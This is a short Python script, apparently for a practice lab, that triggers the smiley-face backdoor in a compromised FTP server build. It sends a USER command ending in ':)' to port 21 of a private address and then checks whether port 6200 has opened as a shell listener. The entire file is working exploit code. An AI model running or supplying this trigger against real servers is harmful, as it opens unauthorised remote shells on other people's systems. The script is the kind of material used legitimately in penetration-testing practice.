import socket, time
s = socket.create_connection(("192.168.232.129", 21), 5)
print(s.recv(1024))           # banner
s.sendall(b"USER aegis:)\r\n")
time.sleep(4)
try:
    s2 = socket.create_connection(("192.168.232.129", 6200), 3)
    print("backdoor open!")
    s2.close()
except:
    print("port 6200 not reachable")
s.close()